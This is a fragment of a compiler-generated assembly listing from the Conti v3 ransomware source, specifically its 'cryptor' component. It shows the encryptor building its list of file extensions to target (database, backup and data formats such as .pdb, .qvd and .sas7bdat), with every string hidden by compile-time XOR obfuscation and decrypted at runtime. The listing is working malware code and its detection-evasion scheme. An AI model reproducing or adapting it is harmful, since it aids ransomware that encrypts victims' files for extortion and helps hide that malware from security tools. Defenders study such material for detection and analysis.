	00 18		 mov	 BYTE PTR $T114[rbp-255], 24
  02d69	c6 85 d2 04 00
	00 4e		 mov	 BYTE PTR $T114[rbp-254], 78 ; 0000004eH
  02d70	c6 85 d3 04 00
	00 44		 mov	 BYTE PTR $T114[rbp-253], 68 ; 00000044H
  02d77	c6 85 d4 04 00
	00 4e		 mov	 BYTE PTR $T114[rbp-252], 78 ; 0000004eH
  02d7e	c6 85 d5 04 00
	00 3a		 mov	 BYTE PTR $T114[rbp-251], 58 ; 0000003aH
  02d85	c6 85 d6 04 00
	00 4e		 mov	 BYTE PTR $T114[rbp-250], 78 ; 0000004eH
  02d8c	c6 85 d7 04 00
	00 6d		 mov	 BYTE PTR $T114[rbp-249], 109 ; 0000006dH
  02d93	c6 85 d8 04 00
	00 4e		 mov	 BYTE PTR $T114[rbp-248], 78 ; 0000004eH
  02d9a	c6 85 d9 04 00
	00 4e		 mov	 BYTE PTR $T114[rbp-247], 78 ; 0000004eH
  02da1	c6 85 da 04 00
	00 4e		 mov	 BYTE PTR $T114[rbp-246], 78 ; 0000004eH
  02da8	0f b6 85 d1 04
	00 00		 movzx	 eax, BYTE PTR $T114[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 407  : 		OBFW(L".pan"),

  02daf	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CL@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<43,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  02db4	48 89 85 b8 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+648], rax

; 408  : 		OBFW(L".pdb"),

  02dbb	48 8d 8d e0 04
	00 00		 lea	 rcx, QWORD PTR $T115[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02dc2	c6 85 e0 04 00
	00 00		 mov	 BYTE PTR $T115[rbp-256], 0
  02dc9	c6 85 e1 04 00
	00 26		 mov	 BYTE PTR $T115[rbp-255], 38 ; 00000026H
  02dd0	c6 85 e2 04 00
	00 49		 mov	 BYTE PTR $T115[rbp-254], 73 ; 00000049H
  02dd7	c6 85 e3 04 00
	00 2b		 mov	 BYTE PTR $T115[rbp-253], 43 ; 0000002bH
  02dde	c6 85 e4 04 00
	00 49		 mov	 BYTE PTR $T115[rbp-252], 73 ; 00000049H
  02de5	c6 85 e5 04 00
	00 13		 mov	 BYTE PTR $T115[rbp-251], 19
  02dec	c6 85 e6 04 00
	00 49		 mov	 BYTE PTR $T115[rbp-250], 73 ; 00000049H
  02df3	c6 85 e7 04 00
	00 0f		 mov	 BYTE PTR $T115[rbp-249], 15
  02dfa	c6 85 e8 04 00
	00 49		 mov	 BYTE PTR $T115[rbp-248], 73 ; 00000049H
  02e01	c6 85 e9 04 00
	00 49		 mov	 BYTE PTR $T115[rbp-247], 73 ; 00000049H
  02e08	c6 85 ea 04 00
	00 49		 mov	 BYTE PTR $T115[rbp-246], 73 ; 00000049H
  02e0f	0f b6 85 e1 04
	00 00		 movzx	 eax, BYTE PTR $T115[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 408  : 		OBFW(L".pdb"),

  02e16	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$01$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<2,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  02e1b	48 89 85 c0 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+656], rax

; 409  : 		OBFW(L".pdm"),

  02e22	48 8d 8d f0 04
	00 00		 lea	 rcx, QWORD PTR $T116[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02e29	c6 85 f0 04 00
	00 00		 mov	 BYTE PTR $T116[rbp-256], 0
  02e30	c6 85 f1 04 00
	00 4c		 mov	 BYTE PTR $T116[rbp-255], 76 ; 0000004cH
  02e37	c6 85 f2 04 00
	00 0c		 mov	 BYTE PTR $T116[rbp-254], 12
  02e3e	c6 85 f3 04 00
	00 55		 mov	 BYTE PTR $T116[rbp-253], 85 ; 00000055H
  02e45	c6 85 f4 04 00
	00 0c		 mov	 BYTE PTR $T116[rbp-252], 12
  02e4c	c6 85 f5 04 00
	00 76		 mov	 BYTE PTR $T116[rbp-251], 118 ; 00000076H
  02e53	c6 85 f6 04 00
	00 0c		 mov	 BYTE PTR $T116[rbp-250], 12
  02e5a	c6 85 f7 04 00
	00 7d		 mov	 BYTE PTR $T116[rbp-249], 125 ; 0000007dH
  02e61	c6 85 f8 04 00
	00 0c		 mov	 BYTE PTR $T116[rbp-248], 12
  02e68	c6 85 f9 04 00
	00 0c		 mov	 BYTE PTR $T116[rbp-247], 12
  02e6f	c6 85 fa 04 00
	00 0c		 mov	 BYTE PTR $T116[rbp-246], 12
  02e76	0f b6 85 f1 04
	00 00		 movzx	 eax, BYTE PTR $T116[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 409  : 		OBFW(L".pdm"),

  02e7d	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BN@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<29,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  02e82	48 89 85 c8 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+664], rax

; 410  : 		OBFW(L".pnz"),

  02e89	48 8d 8d 00 05
	00 00		 lea	 rcx, QWORD PTR $T117[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02e90	c6 85 00 05 00
	00 00		 mov	 BYTE PTR $T117[rbp-256], 0
  02e97	c6 85 01 05 00
	00 6e		 mov	 BYTE PTR $T117[rbp-255], 110 ; 0000006eH
  02e9e	c6 85 02 05 00
	00 3f		 mov	 BYTE PTR $T117[rbp-254], 63 ; 0000003fH
  02ea5	c6 85 03 05 00
	00 43		 mov	 BYTE PTR $T117[rbp-253], 67 ; 00000043H
  02eac	c6 85 04 05 00
	00 3f		 mov	 BYTE PTR $T117[rbp-252], 63 ; 0000003fH
  02eb3	c6 85 05 05 00
	00 4c		 mov	 BYTE PTR $T117[rbp-251], 76 ; 0000004cH
  02eba	c6 85 06 05 00
	00 3f		 mov	 BYTE PTR $T117[rbp-250], 63 ; 0000003fH
  02ec1	c6 85 07 05 00
	00 16		 mov	 BYTE PTR $T117[rbp-249], 22
  02ec8	c6 85 08 05 00
	00 3f		 mov	 BYTE PTR $T117[rbp-248], 63 ; 0000003fH
  02ecf	c6 85 09 05 00
	00 3f		 mov	 BYTE PTR $T117[rbp-247], 63 ; 0000003fH
  02ed6	c6 85 0a 05 00
	00 3f		 mov	 BYTE PTR $T117[rbp-246], 63 ; 0000003fH
  02edd	0f b6 85 01 05
	00 00		 movzx	 eax, BYTE PTR $T117[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 410  : 		OBFW(L".pnz"),

  02ee4	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DL@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<59,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  02ee9	48 89 85 d0 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+672], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02ef0	c6 85 10 05 00
	00 00		 mov	 BYTE PTR $T118[rbp-256], 0
  02ef7	c6 85 11 05 00
	00 29		 mov	 BYTE PTR $T118[rbp-255], 41 ; 00000029H
  02efe	c6 85 12 05 00
	00 10		 mov	 BYTE PTR $T118[rbp-254], 16
  02f05	c6 85 13 05 00
	00 24		 mov	 BYTE PTR $T118[rbp-253], 36 ; 00000024H
  02f0c	c6 85 14 05 00
	00 10		 mov	 BYTE PTR $T118[rbp-252], 16
  02f13	c6 85 15 05 00
	00 59		 mov	 BYTE PTR $T118[rbp-251], 89 ; 00000059H
  02f1a	c6 85 16 05 00
	00 10		 mov	 BYTE PTR $T118[rbp-250], 16
  02f21	c6 85 17 05 00
	00 4f		 mov	 BYTE PTR $T118[rbp-249], 79 ; 0000004fH
  02f28	c6 85 18 05 00
	00 10		 mov	 BYTE PTR $T118[rbp-248], 16
  02f2f	c6 85 19 05 00
	00 10		 mov	 BYTE PTR $T118[rbp-247], 16
  02f36	c6 85 1a 05 00
	00 10		 mov	 BYTE PTR $T118[rbp-246], 16

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  02f3d	0f b6 85 11 05
	00 00		 movzx	 eax, BYTE PTR $T118[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 411  : 		OBFW(L".qry"),

  02f44	48 8d 8d 10 05
	00 00		 lea	 rcx, QWORD PTR $T118[rbp-256]
  02f4b	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DF@$0BA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<53,16,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  02f50	48 89 85 d8 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+680], rax

; 412  : 		OBFW(L".qvd"),

  02f57	48 8d 8d 20 05
	00 00		 lea	 rcx, QWORD PTR $T119[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02f5e	c6 85 20 05 00
	00 00		 mov	 BYTE PTR $T119[rbp-256], 0
  02f65	c6 85 21 05 00
	00 14		 mov	 BYTE PTR $T119[rbp-255], 20
  02f6c	c6 85 22 05 00
	00 27		 mov	 BYTE PTR $T119[rbp-254], 39 ; 00000027H
  02f73	c6 85 23 05 00
	00 64		 mov	 BYTE PTR $T119[rbp-253], 100 ; 00000064H
  02f7a	c6 85 24 05 00
	00 27		 mov	 BYTE PTR $T119[rbp-252], 39 ; 00000027H
  02f81	c6 85 25 05 00
	00 33		 mov	 BYTE PTR $T119[rbp-251], 51 ; 00000033H
  02f88	c6 85 26 05 00
	00 27		 mov	 BYTE PTR $T119[rbp-250], 39 ; 00000027H
  02f8f	c6 85 27 05 00
	00 4b		 mov	 BYTE PTR $T119[rbp-249], 75 ; 0000004bH
  02f96	c6 85 28 05 00
	00 27		 mov	 BYTE PTR $T119[rbp-248], 39 ; 00000027H
  02f9d	c6 85 29 05 00
	00 27		 mov	 BYTE PTR $T119[rbp-247], 39 ; 00000027H
  02fa4	c6 85 2a 05 00
	00 27		 mov	 BYTE PTR $T119[rbp-246], 39 ; 00000027H
  02fab	0f b6 85 21 05
	00 00		 movzx	 eax, BYTE PTR $T119[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 412  : 		OBFW(L".qvd"),

  02fb2	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CJ@$0CH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<41,39,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  02fb7	48 89 85 e0 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+688], rax

; 413  : 		OBFW(L".rbf"),

  02fbe	48 8d 8d 30 05
	00 00		 lea	 rcx, QWORD PTR $T120[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  02fc5	c6 85 30 05 00
	00 00		 mov	 BYTE PTR $T120[rbp-256], 0
  02fcc	c6 85 31 05 00
	00 3b		 mov	 BYTE PTR $T120[rbp-255], 59 ; 0000003bH
  02fd3	c6 85 32 05 00
	00 30		 mov	 BYTE PTR $T120[rbp-254], 48 ; 00000030H
  02fda	c6 85 33 05 00
	00 09		 mov	 BYTE PTR $T120[rbp-253], 9
  02fe1	c6 85 34 05 00
	00 30		 mov	 BYTE PTR $T120[rbp-252], 48 ; 00000030H
  02fe8	c6 85 35 05 00
	00 58		 mov	 BYTE PTR $T120[rbp-251], 88 ; 00000058H
  02fef	c6 85 36 05 00
	00 30		 mov	 BYTE PTR $T120[rbp-250], 48 ; 00000030H
  02ff6	c6 85 37 05 00
	00 64		 mov	 BYTE PTR $T120[rbp-249], 100 ; 00000064H
  02ffd	c6 85 38 05 00
	00 30		 mov	 BYTE PTR $T120[rbp-248], 48 ; 00000030H
  03004	c6 85 39 05 00
	00 30		 mov	 BYTE PTR $T120[rbp-247], 48 ; 00000030H
  0300b	c6 85 3a 05 00
	00 30		 mov	 BYTE PTR $T120[rbp-246], 48 ; 00000030H
  03012	0f b6 85 31 05
	00 00		 movzx	 eax, BYTE PTR $T120[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 413  : 		OBFW(L".rbf"),

  03019	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$02$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<3,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0301e	48 89 85 e8 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+696], rax

; 414  : 		OBFW(L".rctd"),

  03025	48 8d 8d 20 08
	00 00		 lea	 rcx, QWORD PTR $T121[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0302c	c6 85 20 08 00
	00 00		 mov	 BYTE PTR $T121[rbp-256], 0
  03033	c6 85 21 08 00
	00 77		 mov	 BYTE PTR $T121[rbp-255], 119 ; 00000077H
  0303a	c6 85 22 08 00
	00 55		 mov	 BYTE PTR $T121[rbp-254], 85 ; 00000055H
  03041	c6 85 23 08 00
	00 67		 mov	 BYTE PTR $T121[rbp-253], 103 ; 00000067H
  03048	c6 85 24 08 00
	00 55		 mov	 BYTE PTR $T121[rbp-252], 85 ; 00000055H
  0304f	c6 85 25 08 00
	00 72		 mov	 BYTE PTR $T121[rbp-251], 114 ; 00000072H
  03056	c6 85 26 08 00
	00 55		 mov	 BYTE PTR $T121[rbp-250], 85 ; 00000055H
  0305d	c6 85 27 08 00
	00 6e		 mov	 BYTE PTR $T121[rbp-249], 110 ; 0000006eH
  03064	c6 85 28 08 00
	00 55		 mov	 BYTE PTR $T121[rbp-248], 85 ; 00000055H
  0306b	c6 85 29 08 00
	00 36		 mov	 BYTE PTR $T121[rbp-247], 54 ; 00000036H
  03072	c6 85 2a 08 00
	00 55		 mov	 BYTE PTR $T121[rbp-246], 85 ; 00000055H
  03079	c6 85 2b 08 00
	00 55		 mov	 BYTE PTR $T121[rbp-245], 85 ; 00000055H
  03080	c6 85 2c 08 00
	00 55		 mov	 BYTE PTR $T121[rbp-244], 85 ; 00000055H
  03087	0f b6 85 21 08
	00 00		 movzx	 eax, BYTE PTR $T121[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 414  : 		OBFW(L".rctd"),

  0308e	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0ED@$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<67,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  03093	48 89 85 f0 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+704], rax

; 415  : 		OBFW(L".rod"),

  0309a	48 8d 8d 40 05
	00 00		 lea	 rcx, QWORD PTR $T122[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  030a1	c6 85 40 05 00
	00 00		 mov	 BYTE PTR $T122[rbp-256], 0
  030a8	c6 85 41 05 00
	00 23		 mov	 BYTE PTR $T122[rbp-255], 35 ; 00000023H
  030af	c6 85 42 05 00
	00 42		 mov	 BYTE PTR $T122[rbp-254], 66 ; 00000042H
  030b6	c6 85 43 05 00
	00 48		 mov	 BYTE PTR $T122[rbp-253], 72 ; 00000048H
  030bd	c6 85 44 05 00
	00 42		 mov	 BYTE PTR $T122[rbp-252], 66 ; 00000042H
  030c4	c6 85 45 05 00
	00 05		 mov	 BYTE PTR $T122[rbp-251], 5
  030cb	c6 85 46 05 00
	00 42		 mov	 BYTE PTR $T122[rbp-250], 66 ; 00000042H
  030d2	c6 85 47 05 00
	00 62		 mov	 BYTE PTR $T122[rbp-249], 98 ; 00000062H
  030d9	c6 85 48 05 00
	00 42		 mov	 BYTE PTR $T122[rbp-248], 66 ; 00000042H
  030e0	c6 85 49 05 00
	00 42		 mov	 BYTE PTR $T122[rbp-247], 66 ; 00000042H
  030e7	c6 85 4a 05 00
	00 42		 mov	 BYTE PTR $T122[rbp-246], 66 ; 00000042H
  030ee	0f b6 85 41 05
	00 00		 movzx	 eax, BYTE PTR $T122[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 415  : 		OBFW(L".rod"),

  030f5	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GL@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<107,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  030fa	48 89 85 f8 0d
	00 00		 mov	 QWORD PTR Extensions$[rbp+712], rax

; 416  : 		OBFW(L".rodx"),

  03101	48 8d 8d 30 08
	00 00		 lea	 rcx, QWORD PTR $T123[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  03108	c6 85 30 08 00
	00 00		 mov	 BYTE PTR $T123[rbp-256], 0
  0310f	c6 85 31 08 00
	00 1f		 mov	 BYTE PTR $T123[rbp-255], 31
  03116	c6 85 32 08 00
	00 21		 mov	 BYTE PTR $T123[rbp-254], 33 ; 00000021H
  0311d	c6 85 33 08 00
	00 11		 mov	 BYTE PTR $T123[rbp-253], 17
  03124	c6 85 34 08 00
	00 21		 mov	 BYTE PTR $T123[rbp-252], 33 ; 00000021H
  0312b	c6 85 35 08 00
	00 6f		 mov	 BYTE PTR $T123[rbp-251], 111 ; 0000006fH
  03132	c6 85 36 08 00
	00 21		 mov	 BYTE PTR $T123[rbp-250], 33 ; 00000021H
  03139	c6 85 37 08 00
	00 75		 mov	 BYTE PTR $T123[rbp-249], 117 ; 00000075H
  03140	c6 85 38 08 00
	00 21		 mov	 BYTE PTR $T123[rbp-248], 33 ; 00000021H
  03147	c6 85 39 08 00
	00 53		 mov	 BYTE PTR $T123[rbp-247], 83 ; 00000053H
  0314e	c6 85 3a 08 00
	00 21		 mov	 BYTE PTR $T123[rbp-246], 33 ; 00000021H
  03155	c6 85 3b 08 00
	00 21		 mov	 BYTE PTR $T123[rbp-245], 33 ; 00000021H
  0315c	c6 85 3c 08 00
	00 21		 mov	 BYTE PTR $T123[rbp-244], 33 ; 00000021H
  03163	0f b6 85 31 08
	00 00		 movzx	 eax, BYTE PTR $T123[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 416  : 		OBFW(L".rodx"),

  0316a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0L@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<11,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  0316f	48 89 85 00 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+720], rax

; 417  : 		OBFW(L".rpd"),

  03176	48 8d 8d 50 05
	00 00		 lea	 rcx, QWORD PTR $T124[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0317d	c6 85 50 05 00
	00 00		 mov	 BYTE PTR $T124[rbp-256], 0
  03184	c6 85 51 05 00
	00 60		 mov	 BYTE PTR $T124[rbp-255], 96 ; 00000060H
  0318b	c6 85 52 05 00
	00 1c		 mov	 BYTE PTR $T124[rbp-254], 28
  03192	c6 85 53 05 00
	00 40		 mov	 BYTE PTR $T124[rbp-253], 64 ; 00000040H
  03199	c6 85 54 05 00
	00 1c		 mov	 BYTE PTR $T124[rbp-252], 28
  031a0	c6 85 55 05 00
	00 32		 mov	 BYTE PTR $T124[rbp-251], 50 ; 00000032H
  031a7	c6 85 56 05 00
	00 1c		 mov	 BYTE PTR $T124[rbp-250], 28
  031ae	c6 85 57 05 00
	00 5d		 mov	 BYTE PTR $T124[rbp-249], 93 ; 0000005dH
  031b5	c6 85 58 05 00
	00 1c		 mov	 BYTE PTR $T124[rbp-248], 28
  031bc	c6 85 59 05 00
	00 1c		 mov	 BYTE PTR $T124[rbp-247], 28
  031c3	c6 85 5a 05 00
	00 1c		 mov	 BYTE PTR $T124[rbp-246], 28
  031ca	0f b6 85 51 05
	00 00		 movzx	 eax, BYTE PTR $T124[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 417  : 		OBFW(L".rpd"),

  031d1	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$06$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<7,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  031d6	48 89 85 08 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+728], rax

; 418  : 		OBFW(L".rsd"),

  031dd	48 8d 8d 60 05
	00 00		 lea	 rcx, QWORD PTR $T125[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  031e4	c6 85 60 05 00
	00 00		 mov	 BYTE PTR $T125[rbp-256], 0
  031eb	c6 85 61 05 00
	00 3a		 mov	 BYTE PTR $T125[rbp-255], 58 ; 0000003aH
  031f2	c6 85 62 05 00
	00 5d		 mov	 BYTE PTR $T125[rbp-254], 93 ; 0000005dH
  031f9	c6 85 63 05 00
	00 43		 mov	 BYTE PTR $T125[rbp-253], 67 ; 00000043H
  03200	c6 85 64 05 00
	00 5d		 mov	 BYTE PTR $T125[rbp-252], 93 ; 0000005dH
  03207	c6 85 65 05 00
	00 45		 mov	 BYTE PTR $T125[rbp-251], 69 ; 00000045H
  0320e	c6 85 66 05 00
	00 5d		 mov	 BYTE PTR $T125[rbp-250], 93 ; 0000005dH
  03215	c6 85 67 05 00
	00 27		 mov	 BYTE PTR $T125[rbp-249], 39 ; 00000027H
  0321c	c6 85 68 05 00
	00 5d		 mov	 BYTE PTR $T125[rbp-248], 93 ; 0000005dH
  03223	c6 85 69 05 00
	00 5d		 mov	 BYTE PTR $T125[rbp-247], 93 ; 0000005dH
  0322a	c6 85 6a 05 00
	00 5d		 mov	 BYTE PTR $T125[rbp-246], 93 ; 0000005dH
  03231	0f b6 85 61 05
	00 00		 movzx	 eax, BYTE PTR $T125[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 418  : 		OBFW(L".rsd"),

  03238	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$01$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<2,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0323d	48 89 85 10 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+736], rax

; 419  : 		OBFW(L".sas7bdat"),

  03244	48 8d 8d e0 09
	00 00		 lea	 rcx, QWORD PTR $T126[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0324b	c6 85 e0 09 00
	00 00		 mov	 BYTE PTR $T126[rbp-256], 0
  03252	c6 85 e1 09 00
	00 6d		 mov	 BYTE PTR $T126[rbp-255], 109 ; 0000006dH
  03259	c6 85 e2 09 00
	00 12		 mov	 BYTE PTR $T126[rbp-254], 18
  03260	c6 85 e3 09 00
	00 37		 mov	 BYTE PTR $T126[rbp-253], 55 ; 00000037H
  03267	c6 85 e4 09 00
	00 12		 mov	 BYTE PTR $T126[rbp-252], 18
  0326e	c6 85 e5 09 00
	00 2f		 mov	 BYTE PTR $T126[rbp-251], 47 ; 0000002fH
  03275	c6 85 e6 09 00
	00 12		 mov	 BYTE PTR $T126[rbp-250], 18
  0327c	c6 85 e7 09 00
	00 37		 mov	 BYTE PTR $T126[rbp-249], 55 ; 00000037H
  03283	c6 85 e8 09 00
	00 12		 mov	 BYTE PTR $T126[rbp-248], 18
  0328a	c6 85 e9 09 00
	00 71		 mov	 BYTE PTR $T126[rbp-247], 113 ; 00000071H
  03291	c6 85 ea 09 00
	00 12		 mov	 BYTE PTR $T126[rbp-246], 18
  03298	c6 85 eb 09 00
	00 76		 mov	 BYTE PTR $T126[rbp-245], 118 ; 00000076H
  0329f	c6 85 ec 09 00
	00 12		 mov	 BYTE PTR $T126[rbp-244], 18
  032a6	c6 85 ed 09 00
	00 06		 mov	 BYTE PTR $T126[rbp-243], 6
  032ad	c6 85 ee 09 00
	00 12		 mov	 BYTE PTR $T126[rbp-242], 18
  032b4	c6 85 ef 09 00
	00 2f		 mov	 BYTE PTR $T126[rbp-241], 47 ; 0000002fH
  032bb	c6 85 f0 09 00
	00 12		 mov	 BYTE PTR $T126[rbp-240], 18
  032c2	c6 85 f1 09 00
	00 7e		 mov	 BYTE PTR $T126[rbp-239], 126 ; 0000007eH
  032c9	c6 85 f2 09 00
	00 12		 mov	 BYTE PTR $T126[rbp-238], 18
  032d0	c6 85 f3 09 00
	00 12		 mov	 BYTE PTR $T126[rbp-237], 18
  032d7	c6 85 f4 09 00
	00 12		 mov	 BYTE PTR $T126[rbp-236], 18
  032de	0f b6 85 e1 09
	00 00		 movzx	 eax, BYTE PTR $T126[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 419  : 		OBFW(L".sas7bdat"),

  032e5	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EH@$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEAAPEBDXZ ; MetaBuffer<71,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::decrypt
  032ea	48 89 85 18 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+744], rax

; 420  : 		OBFW(L".sbf"),

  032f1	48 8d 8d 70 05
	00 00		 lea	 rcx, QWORD PTR $T127[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  032f8	c6 85 70 05 00
	00 00		 mov	 BYTE PTR $T127[rbp-256], 0
  032ff	c6 85 71 05 00
	00 75		 mov	 BYTE PTR $T127[rbp-255], 117 ; 00000075H
  03306	c6 85 72 05 00
	00 61		 mov	 BYTE PTR $T127[rbp-254], 97 ; 00000061H
  0330d	c6 85 73 05 00
	00 14		 mov	 BYTE PTR $T127[rbp-253], 20
  03314	c6 85 74 05 00
	00 61		 mov	 BYTE PTR $T127[rbp-252], 97 ; 00000061H
  0331b	c6 85 75 05 00
	00 70		 mov	 BYTE PTR $T127[rbp-251], 112 ; 00000070H
  03322	c6 85 76 05 00
	00 61		 mov	 BYTE PTR $T127[rbp-250], 97 ; 00000061H
  03329	c6 85 77 05 00
	00 35		 mov	 BYTE PTR $T127[rbp-249], 53 ; 00000035H
  03330	c6 85 78 05 00
	00 61		 mov	 BYTE PTR $T127[rbp-248], 97 ; 00000061H
  03337	c6 85 79 05 00
	00 61		 mov	 BYTE PTR $T127[rbp-247], 97 ; 00000061H
  0333e	c6 85 7a 05 00
	00 61		 mov	 BYTE PTR $T127[rbp-246], 97 ; 00000061H
  03345	0f b6 85 71 05
	00 00		 movzx	 eax, BYTE PTR $T127[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 420  : 		OBFW(L".sbf"),

  0334c	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BB@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<17,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  03351	48 89 85 20 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+752], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

